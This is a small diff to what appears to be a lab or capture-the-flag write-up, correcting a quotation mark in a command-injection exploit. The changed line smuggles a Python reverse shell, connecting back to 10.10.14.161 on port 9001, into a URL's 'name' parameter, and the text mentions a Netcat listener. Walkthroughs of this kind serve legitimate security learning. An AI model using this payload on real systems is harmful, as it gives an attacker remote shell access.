@@ -140,7 +140,7 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 To open a reverse shell, I used the following exploit:
 
 ```bash
-http://10.10.14.161:8000/?name=%20`python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.14.161",9001));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")`
+http://10.10.14.161:8000/?name=%20`python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.14.161",9001));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'`
 ```
 
 And opened a Netcat listener:
